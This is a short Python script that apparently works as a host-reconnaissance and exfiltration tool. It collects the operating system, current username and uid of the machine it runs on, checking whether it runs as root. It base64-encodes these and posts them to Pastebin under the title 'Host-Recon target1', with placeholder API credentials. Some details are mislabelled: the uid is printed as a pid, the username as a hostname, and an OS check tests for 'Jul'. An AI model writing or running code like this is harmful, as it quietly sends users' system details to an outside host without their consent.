import os
import getpass
import platform
import requests
import base64



def OS_Recn():
    machine_os = platform.system()
    username = ""
    if machine_os == "Linux" or machine_os == "Jul": 
        print("Machine is running on Linux/OSX \n")
        uid = os.getuid()
        if (uid == 0):
            username = "root" + " " + str(uid) + " " + machine_os
        else:
            username = getpass.getuser() + " " + str(uid) + " " + machine_os

    else:
        print("Machine is running on Windows \n")
        username = getpass.getuser() + " " + "user" + " " + machine_os
    return username


def upload_pasteBin(title, text):
    name = 'enter_your_username'
    passwd = 'enter_your_password'
    key = 'enter_your_dev_key_here'
    title = "Host-Recon " + title
 
    login = {
        'api_dev_key': key,
        'api_user_name': name,
        'api_user_password': passwd
    }

    data = {
        'api_option': 'paste',
        'api_dev_key':key,
        'api_user_key': None,
        'api_paste_code':text,
        'api_paste_name':title,
    }
    
    try:
        login = requests.post("https://pastebin.com/api/api_login.php", data=login)
        print("Login status: ", login.status_code if login.status_code != 200 else "OK/200")
        data['api_user_key'] = login.text
    except: 
        print("Login ERROR")

    try:  
        r = requests.post("https://pastebin.com/api/api_post.php", data=data)
        print("Paste send: ", r.status_code if r.status_code != 200 else "OK/200")
        print("Paste Link: ", r.text)
    except:
        print("Paste-ing ERROR")
    

def main():
    result = OS_Recn()
    encodedresult = base64.b64encode(result.encode('utf-8'))
    result = result.split()

    operatingSystem = result[2]
    hostname = result[0]
    pid = result[1]

    if result[2] == "Linux" or result[2] == "Darwin":
        print(f"Machine is running on {operatingSystem} and the current pid is: {pid} with the username: {hostname}")
    else:
        print(f"Machine is running on {operatingSystem} and the current user is {hostname}")
    
    upload_pasteBin("target1", encodedresult)


if __name__ == "__main__":
    main()
